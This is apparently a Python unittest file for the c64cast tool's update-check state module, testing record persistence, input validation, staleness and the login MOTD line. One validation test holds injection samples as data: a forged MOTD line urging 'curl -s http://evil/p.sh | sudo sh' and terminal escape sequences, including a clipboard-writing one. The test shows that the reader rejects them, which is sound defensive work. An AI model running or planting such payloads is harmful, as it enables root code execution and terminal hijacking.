"""Tests for c64cast.app.update_state — the persisted "last PyPI check"
record and the MOTD line derived from it."""

from __future__ import annotations

import contextlib
import json
import tempfile
import unittest
from collections.abc import Generator
from dataclasses import replace
from pathlib import Path
from unittest import mock

from c64cast.app import update_state
from c64cast.app.update_state import (
    SECONDS_PER_DAY,
    STALE_AFTER_DAYS,
    UpdateCheck,
    is_stale,
    motd_line,
    read_update_state,
    rechecked,
    record_check,
    write_update_state,
)


@contextlib.contextmanager
def _tmp_dir() -> Generator[str]:
    with tempfile.TemporaryDirectory() as d:
        yield d


@contextlib.contextmanager
def _tmp_json_path() -> Generator[Path]:
    with _tmp_dir() as d:
        yield Path(d) / "update_check.json"


class RoundTripTest(unittest.TestCase):
    def test_write_then_read_recovers_the_same_check(self):
        with _tmp_json_path() as path:
            check = UpdateCheck(
                checked_at=123.5, running_version="0.5.0", latest_version="0.6.0", newer=True
            )
            write_update_state(check, path=path)
            self.assertEqual(read_update_state(path=path), check)

    def test_none_latest_version_and_newer_round_trip(self):
        with _tmp_json_path() as path:
            check = UpdateCheck(
                checked_at=1.0, running_version="0.5.0", latest_version=None, newer=None
            )
            write_update_state(check, path=path)
            self.assertEqual(read_update_state(path=path), check)

    def test_a_second_write_overwrites_rather_than_appends(self):
        with _tmp_json_path() as path:
            write_update_state(
                UpdateCheck(
                    checked_at=1.0, running_version="0.5.0", latest_version=None, newer=None
                ),
                path=path,
            )
            second = UpdateCheck(
                checked_at=2.0, running_version="0.5.0", latest_version="0.6.0", newer=True
            )
            write_update_state(second, path=path)
            self.assertEqual(read_update_state(path=path), second)

    def test_write_creates_missing_parent_directories(self):
        with _tmp_dir() as d:
            nested = Path(d) / "nested" / "dir" / "update_check.json"
            write_update_state(
                UpdateCheck(
                    checked_at=1.0, running_version="0.5.0", latest_version=None, newer=None
                ),
                path=nested,
            )
            self.assertTrue(nested.is_file())


class WriteFailureTest(unittest.TestCase):
    """`cli_commands.run_check_for_updates` records before it prints the
    answer it already holds, so a write that cannot succeed must not take
    the answer — or the systemd unit's exit status — down with it."""

    attempt = UpdateCheck(
        checked_at=1.0, running_version="0.5.0", latest_version="0.6.0", newer=True
    )

    def test_an_unwritable_data_root_warns_instead_of_raising(self):
        # A $C64CAST_DATA_DIR pointed into a squashfs, or a tmpfs that filled.
        with _tmp_json_path() as path:
            with (
                mock.patch.object(
                    update_state, "atomic_write_text", side_effect=OSError("read-only")
                ),
                self.assertLogs("c64cast.app.update_state", level="WARNING") as logs,
            ):
                record_check(self.attempt, path=path)
        self.assertIn("could not record the update check", logs.output[0])

    def test_a_directory_planted_at_the_slot_warns_instead_of_raising(self):
        # One mkdir by whatever account owns the data root used to make every
        # subsequent `--check-for-updates --write-state` traceback: os.replace
        # cannot rename a file onto a directory, and record_check did not
        # catch it, so the slot could never be repaired.
        with _tmp_dir() as d:
            planted = Path(d) / "update_check.json"
            planted.mkdir()
            with self.assertLogs("c64cast.app.update_state", level="WARNING"):
                record_check(self.attempt, path=planted)
            self.assertIsNone(read_update_state(path=planted))


class RecordCheckTest(unittest.TestCase):
    """An attempt that couldn't reach PyPI knows only when it ran — it must
    not retract the last real answer on its way past."""

    answered = UpdateCheck(
        checked_at=1.0, running_version="0.5.0", latest_version="0.6.0", newer=True
    )
    unanswered = UpdateCheck(
        checked_at=2.0, running_version="0.5.0", latest_version=None, newer=None
    )

    def test_an_answer_is_recorded_as_given(self):
        with _tmp_json_path() as path:
            record_check(self.answered, path=path)
            self.assertEqual(read_update_state(path=path), self.answered)

    def test_a_later_answer_replaces_an_earlier_one(self):
        with _tmp_json_path() as path:
            record_check(self.answered, path=path)
            newest = UpdateCheck(
                checked_at=3.0, running_version="0.5.0", latest_version="0.7.0", newer=True
            )
            record_check(newest, path=path)
            self.assertEqual(read_update_state(path=path), newest)

    def test_a_failed_attempt_with_nothing_recorded_yet_records_only_itself(self):
        with _tmp_json_path() as path:
            record_check(self.unanswered, path=path)
            self.assertEqual(
                read_update_state(path=path),
                replace(self.unanswered, unanswered_since=self.unanswered.checked_at),
            )

    def test_a_failed_attempt_keeps_the_last_answer_and_moves_only_checked_at(self):
        with _tmp_json_path() as path:
            record_check(self.answered, path=path)
            record_check(self.unanswered, path=path)
            kept = read_update_state(path=path)
            assert kept is not None
            self.assertEqual(kept.latest_version, "0.6.0")
            self.assertIs(kept.newer, True)
            self.assertEqual(kept.checked_at, 2.0)

    def test_a_kept_answer_is_re_answered_for_a_version_upgraded_since(self):
        # Upgraded to the release the kept answer names, then a failed
        # attempt: the notice settles rather than being carried forward as a
        # standing offer of a release this install already has.
        with _tmp_json_path() as path:
            record_check(self.answered, path=path)
            record_check(replace(self.unanswered, running_version="0.6.0"), path=path)
            kept = read_update_state(path=path)
            assert kept is not None
            self.assertEqual(kept.running_version, "0.6.0")
            self.assertIs(kept.newer, False)
            self.assertEqual(motd_line(kept, kept.checked_at), "")

    def test_a_failed_attempt_after_a_failed_attempt_still_only_moves_checked_at(self):
        with _tmp_json_path() as path:
            record_check(self.unanswered, path=path)
            record_check(replace(self.unanswered, checked_at=9.0), path=path)
            self.assertEqual(
                read_update_state(path=path),
                replace(self.unanswered, checked_at=9.0, unanswered_since=2.0),
            )

    def test_the_silence_is_dated_from_the_first_failure_not_the_latest(self):
        # What tells a reader how old the held answer is. `checked_at` cannot:
        # an appliance offline for a year still bumps it daily as its timer
        # fails.
        with _tmp_json_path() as path:
            record_check(self.answered, path=path)
            record_check(replace(self.unanswered, checked_at=100.0), path=path)
            record_check(replace(self.unanswered, checked_at=200.0), path=path)
            slot = read_update_state(path=path)
            assert slot is not None
            self.assertEqual(slot.unanswered_since, 100.0)
            self.assertEqual(slot.checked_at, 200.0)

    def test_an_answer_ends_the_silence(self):
        with _tmp_json_path() as path:
            record_check(replace(self.unanswered, checked_at=100.0), path=path)
            record_check(replace(self.answered, checked_at=200.0), path=path)
            slot = read_update_state(path=path)
            assert slot is not None
            self.assertIsNone(slot.unanswered_since)


class ReadToleranceTest(unittest.TestCase):
    def test_a_missing_file_reads_as_none(self):
        with _tmp_dir() as d:
            self.assertIsNone(read_update_state(path=Path(d) / "nope.json"))

    def test_non_json_content_reads_as_none(self):
        with _tmp_json_path() as path:
            path.write_text("not json {{{", encoding="utf-8")
            with self.assertLogs("c64cast.app.update_state", level="DEBUG"):
                self.assertIsNone(read_update_state(path=path))

    def test_a_json_array_reads_as_none(self):
        with _tmp_json_path() as path:
            path.write_text("[1, 2, 3]", encoding="utf-8")
            with self.assertLogs("c64cast.app.update_state", level="DEBUG"):
                self.assertIsNone(read_update_state(path=path))

    def test_a_file_without_the_unanswered_since_field_still_reads(self):
        # Written by a release before the field existed: absent and null mean
        # the same thing here, so it reads rather than being thrown away.
        with _tmp_json_path() as path:
            path.write_text(
                json.dumps(
                    {
                        "checked_at": 1.0,
                        "running_version": "0.5.0",
                        "latest_version": "0.6.0",
                        "newer": True,
                    }
                ),
                encoding="utf-8",
            )
            slot = read_update_state(path=path)
            assert slot is not None
            self.assertIsNone(slot.unanswered_since)

    def test_missing_fields_read_as_none(self):
        with _tmp_json_path() as path:
            path.write_text(json.dumps({"checked_at": 1.0}), encoding="utf-8")
            with self.assertLogs("c64cast.app.update_state", level="DEBUG"):
                self.assertIsNone(read_update_state(path=path))

    def test_wrong_typed_fields_read_as_none(self):
        with _tmp_json_path() as path:
            path.write_text(
                json.dumps(
                    {
                        "checked_at": "not-a-number",
                        "running_version": "0.5.0",
                        "latest_version": None,
                        "newer": None,
                    }
                ),
                encoding="utf-8",
            )
            with self.assertLogs("c64cast.app.update_state", level="DEBUG"):
                self.assertIsNone(read_update_state(path=path))

    def test_invalid_utf8_bytes_read_as_none(self):
        # read_text signals bad bytes with UnicodeDecodeError, a ValueError,
        # and the read was guarded by `except OSError` alone — so one bad byte
        # raised out of a "never raises" function into GET /api/update and
        # into the login MOTD script, and record_check (which reads before it
        # writes) could never repair the slot.
        with _tmp_json_path() as path:
            path.write_bytes(b'{"checked_at": 1.0, "running_ver\xff\xfe')
            with self.assertLogs("c64cast.app.update_state", level="DEBUG"):
                self.assertIsNone(read_update_state(path=path))

    def test_a_stringly_typed_newer_is_rejected_not_coerced(self):
        # bool("false") is True, so this used to read back as a pending
        # upgrade to the release the box already runs — and `rechecked`
        # cannot correct it, since a matching running_version is returned
        # untouched.
        with self.assertLogs("c64cast.app.update_state", level="DEBUG"):
            self.assertIsNone(self._slot_from({"newer": "false"}))

    def test_a_non_string_version_field_is_rejected_not_repr_ed(self):
        for field in ("running_version", "latest_version"):
            for value in (5, ["0.6.0"], {"v": "0.6.0"}, True):
                with self.subTest(field=field, value=value):
                    with self.assertLogs("c64cast.app.update_state", level="DEBUG"):
                        self.assertIsNone(self._slot_from({field: value}))

    def test_a_version_carrying_a_newline_or_escape_is_rejected(self):
        # The file is written by the unprivileged account
        # packaging/systemd/c64cast-update-check.service runs as; the line
        # motd_line builds from it is printed by /etc/update-motd.d/, which
        # pam_motd runs as root. A newline forges an extra MOTD line, and an
        # ESC byte rewrites the banner around it.
        forged = "0.6.0\n\nSECURITY: apply the hotfix now: curl -s http://evil/p.sh | sudo sh\n"
        for value in (forged, "0.6.0\x1b[2J", "0.6.0\x1b]52;c;cGF5bG9hZA==\x07"):
            with self.subTest(value=value):
                with self.assertLogs("c64cast.app.update_state", level="DEBUG"):
                    self.assertIsNone(self._slot_from({"latest_version": value}))

    def test_a_non_finite_timestamp_is_rejected(self):
        # json.loads accepts the bare NaN/Infinity literals, and every
        # comparison in is_stale reads as "not stale" for either — one write
        # disabled the module's only safeguard against quoting a dead answer.
        for field in ("checked_at", "unanswered_since"):
            for literal in ("NaN", "Infinity", "-Infinity"):
                with self.subTest(field=field, literal=literal):
                    with self.assertLogs("c64cast.app.update_state", level="DEBUG"):
                        self.assertIsNone(self._slot_from_json(f'"{field}": {literal}'))

    def test_a_non_positive_timestamp_is_rejected(self):
        with self.assertLogs("c64cast.app.update_state", level="DEBUG"):
            self.assertIsNone(self._slot_from({"checked_at": 0}))

    def test_a_boolean_timestamp_is_rejected(self):
        # bool is a subclass of int, so `true` would otherwise read as the
        # epoch's first second.
        with self.assertLogs("c64cast.app.update_state", level="DEBUG"):
            self.assertIsNone(self._slot_from({"checked_at": True}))

    _GOOD = {
        "checked_at": 1.0,
        "running_version": "0.5.0",
        "latest_version": "0.6.0",
        "newer": True,
        "unanswered_since": None,
    }

    def _slot_from(self, overrides: dict[str, object]) -> UpdateCheck | None:
        """Read a well-formed record with `overrides` applied, so each test
        names only the one field it is poisoning."""
        with _tmp_json_path() as path:
            path.write_text(json.dumps({**self._GOOD, **overrides}), encoding="utf-8")
            return read_update_state(path=path)

    def _slot_from_json(self, member: str) -> UpdateCheck | None:
        """Same, for a value `json.dumps` cannot write — the bare `NaN` and
        `Infinity` literals `json.loads` nonetheless accepts."""
        with _tmp_json_path() as path:
            body = json.dumps(self._GOOD)[:-1] + f", {member}}}"
            path.write_text(body, encoding="utf-8")
            return read_update_state(path=path)

    def test_the_fixture_the_poisoning_tests_start_from_reads_cleanly(self):
        slot = self._slot_from({})
        assert slot is not None
        self.assertEqual(slot.latest_version, "0.6.0")


class RecheckedTest(unittest.TestCase):
    """A recorded check names the version that was running when it ran; the
    surfaces that report it re-answer against the version running now."""

    pending = UpdateCheck(
        checked_at=1.0, running_version="0.5.0", latest_version="0.6.0", newer=True
    )

    def test_no_check_stays_none(self):
        self.assertIsNone(rechecked(None, "0.5.0"))

    def test_the_same_running_version_is_returned_untouched(self):
        self.assertIs(rechecked(self.pending, "0.5.0"), self.pending)

    def test_an_upgrade_to_the_named_release_clears_the_pending_answer(self):
        after = rechecked(self.pending, "0.6.0")
        assert after is not None
        self.assertIs(after.newer, False)
        self.assertEqual(after.running_version, "0.6.0")
        self.assertEqual(motd_line(after, after.checked_at), "")

    def test_a_release_still_newer_than_the_upgraded_version_stays_pending(self):
        after = rechecked(self.pending, "0.5.1")
        assert after is not None
        self.assertIs(after.newer, True)
        self.assertIn("0.5.1", motd_line(after, after.checked_at))

    def test_a_check_that_could_not_answer_stays_unanswerable(self):
        never_answered = UpdateCheck(
            checked_at=1.0, running_version="0.5.0", latest_version=None, newer=None
        )
        after = rechecked(never_answered, "0.6.0")
        assert after is not None
        self.assertIsNone(after.newer)

    def test_an_uncomparable_version_reads_as_unanswerable(self):
        after = rechecked(self.pending, "not-a-version")
        assert after is not None
        self.assertIsNone(after.newer)


NOW = 1_800_000_000.0


def _days_ago(days: float) -> float:
    return NOW - days * SECONDS_PER_DAY


class IsStaleTest(unittest.TestCase):
    """How old the *answer* is, which is not how long ago the last attempt
    ran — an offline appliance's timer keeps bumping `checked_at` daily."""

    def test_no_check_is_not_stale(self):
        self.assertFalse(is_stale(None, NOW))

    def test_a_recently_answered_check_is_not_stale(self):
        fresh = UpdateCheck(
            checked_at=_days_ago(2), running_version="0.5.0", latest_version="0.5.0", newer=False
        )
        self.assertFalse(is_stale(fresh, NOW))

    def test_an_answer_nobody_has_refreshed_in_a_year_is_stale(self):
        # No timer at all: the last attempt answered, and that was that.
        forgotten = UpdateCheck(
            checked_at=_days_ago(365), running_version="0.5.0", latest_version="0.5.0", newer=False
        )
        self.assertTrue(is_stale(forgotten, NOW))

    def test_a_daily_timer_failing_for_months_is_stale_despite_a_fresh_attempt(self):
        silent = UpdateCheck(
            checked_at=NOW,
            running_version="0.5.0",
            latest_version="0.5.0",
            newer=False,
            unanswered_since=_days_ago(90),
        )
        self.assertTrue(is_stale(silent, NOW))

    def test_a_short_outage_is_not_stale(self):
        blipped = UpdateCheck(
            checked_at=NOW,
            running_version="0.5.0",
            latest_version="0.5.0",
            newer=False,
            unanswered_since=_days_ago(STALE_AFTER_DAYS - 1),
        )
        self.assertFalse(is_stale(blipped, NOW))

    def test_a_date_in_the_future_is_stale_rather_than_fresh(self):
        # "Can't tell how old this is" is not "recent" — the same asymmetry
        # _checkout_is_dirty's None gets. A far-future date otherwise made
        # every comparison here read as fresh, forever.
        dated_ahead = UpdateCheck(
            checked_at=_days_ago(-3650),
            running_version="0.5.0",
            latest_version="0.5.0",
            newer=False,
        )
        self.assertTrue(is_stale(dated_ahead, NOW))

    def test_a_clock_skewed_by_an_hour_is_not_called_stale(self):
        skewed = UpdateCheck(
            checked_at=NOW + 3600.0, running_version="0.5.0", latest_version="0.5.0", newer=False
        )
        self.assertFalse(is_stale(skewed, NOW))

    def test_a_non_finite_date_is_stale(self):
        # read_update_state rejects such a record outright; this guards a
        # check built in process.
        for stamp in (float("nan"), float("inf"), float("-inf")):
            with self.subTest(stamp=stamp):
                broken = UpdateCheck(
                    checked_at=stamp,
                    running_version="0.5.0",
                    latest_version="0.5.0",
                    newer=False,
                )
                self.assertTrue(is_stale(broken, NOW))


class MotdLineTest(unittest.TestCase):
    def test_no_check_is_silent(self):
        self.assertEqual(motd_line(None, NOW), "")

    def test_up_to_date_is_silent(self):
        check = UpdateCheck(
            checked_at=NOW, running_version="0.5.0", latest_version="0.5.0", newer=False
        )
        self.assertEqual(motd_line(check, NOW), "")

    def test_uncomparable_is_silent(self):
        check = UpdateCheck(
            checked_at=NOW, running_version="0.5.0", latest_version="0.6.0", newer=None
        )
        self.assertEqual(motd_line(check, NOW), "")

    def test_a_newer_release_names_both_versions_and_the_upgrade_command(self):
        check = UpdateCheck(
            checked_at=NOW, running_version="0.5.0", latest_version="0.6.0", newer=True
        )
        line = motd_line(check, NOW)
        self.assertIn("0.6.0", line)
        self.assertIn("0.5.0", line)
        self.assertIn("c64cast --upgrade", line)

    def test_a_stale_check_says_so_and_names_the_command_that_would_settle_it(self):
        silent = UpdateCheck(
            checked_at=NOW,
            running_version="0.5.0",
            latest_version="0.5.0",
            newer=False,
            unanswered_since=_days_ago(90),
        )
        line = motd_line(silent, NOW)
        self.assertIn(str(STALE_AFTER_DAYS), line)
        self.assertIn("0.5.0", line)
        self.assertIn("c64cast --check-for-updates", line)

    def test_the_stale_line_blames_the_check_rather_than_pypi(self):
        # is_stale falls back to checked_at when unanswered_since is None, and
        # in that branch the last attempt *did* answer — the no-timer laptop
        # nobody has asked in a while. "No answer from PyPI" sent an admin
        # hunting a network fault that does not exist.
        forgotten = UpdateCheck(
            checked_at=_days_ago(365), running_version="0.5.0", latest_version="0.5.0", newer=False
        )
        line = motd_line(forgotten, NOW)
        self.assertIn("No update check has succeeded", line)
        self.assertNotIn("PyPI", line)

    def test_a_pending_upgrade_outranks_a_stale_check(self):
        # Both true at once: the release named is the more useful thing to
        # print, and acting on it settles the silence too.
        both = UpdateCheck(
            checked_at=NOW,
            running_version="0.5.0",
            latest_version="0.6.0",
            newer=True,
            unanswered_since=_days_ago(90),
        )
        self.assertIn("c64cast --upgrade", motd_line(both, NOW))


if __name__ == "__main__":
    unittest.main()
